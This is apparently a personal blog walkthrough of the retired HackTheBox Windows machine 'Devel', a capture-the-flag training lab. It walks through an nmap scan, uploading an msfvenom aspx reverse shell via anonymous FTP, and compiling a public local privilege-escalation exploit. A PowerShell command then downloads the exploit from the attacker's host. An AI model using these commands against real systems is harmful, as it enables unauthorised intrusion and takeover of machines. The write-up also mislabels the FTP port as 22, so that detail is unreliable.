---
title: Devel - HackTheBox Walkthrough
date: 2021-10-19 12:00:00 
categories: [HackTheBox,Windows]
tags: [ftp,aspx]
img_path: /assets/img/HTB/Devel/
image: 
  path: 00-banner.png
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Devel` a retired windows machine from HackTheBox rated easy. Without further ado, let’s begin.
# Recon
## Nmap Scan
As always we'll start with a nmap scan to discover the open ports and services.
```console
$ cat nmap-scan
# Nmap 7.91 scan initiated Mon Oct 18 19:50:31 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.239.45
Nmap scan report for 10.129.239.45
Host is up (0.13s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 18 19:50:51 2021 -- 1 IP address (1 host up) scanned in 19.91 seconds
```
There only two ports open `22:FTP` and `80:HTTP`.
## FTP Enumeration
Anonymous login is allowed in FTP. This means that we can login with the user `anonymous` and any password, inside the server there a image and a htm file that seems is the default page of IIS 7 (Internet Information Services).

![01-ftp](01-ftp.png)

## HTTP Enumeration
If we go to the web, it show us the same default page of IIS 7 that there in FTP service.

![02-web](02-web.png)

Let's try to upload a test file to see if this services are connected by the same directory.

![03-ftp](03-ftp.png)

Going to `http://10.129.239.45/test.html` to open the test.html

![04-test](04-test.png)

# Initial Foothold
That's when I decided to generate a reverse shell using `msfvenom` with `aspx` format.
```console
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.75 LPORT=443 -f aspx -o RevShell.aspx
```
Once I uploaded to the FTP service and loaded in the browser this url `http://10.129.239.45/RevShell.aspx`. I got the shell in the netcat port listener.

![05-nc](05-nc.png)

I change the directory to `C:\Users` but I couldn't access to babis' home directory.

![06-dir](06-dir.png)

# Privilage Escalation
With `systeminfo`  we view information about the computer.

![07-systeminfo](07-systeminfo.png)

This machine is a `Microsoft Windows 7 Enterprise 6.1.7600` and is vulnerable to a [Local Privilege Escalation](https://www.exploit-db.com/exploits/40564).

![08-exploit](08-exploit.png)

A comment in the exploit explain how compile this script. `Mingw-w64` has to be installed.

```console
$ sudo apt install mingw-w64
$ i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

To transfere the `.exe` I opened a server using python3 and ran the next command in the Windows machine.
```console
$ powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75/40564.exe', 'C:\Windows\Temp\40564.exe')"
```

![09-authority](09-authority.png)

Execute it and now we are Administrators.

![10-root](10-root.png)

We got root.txt
That’s it for now guys. Until next time.
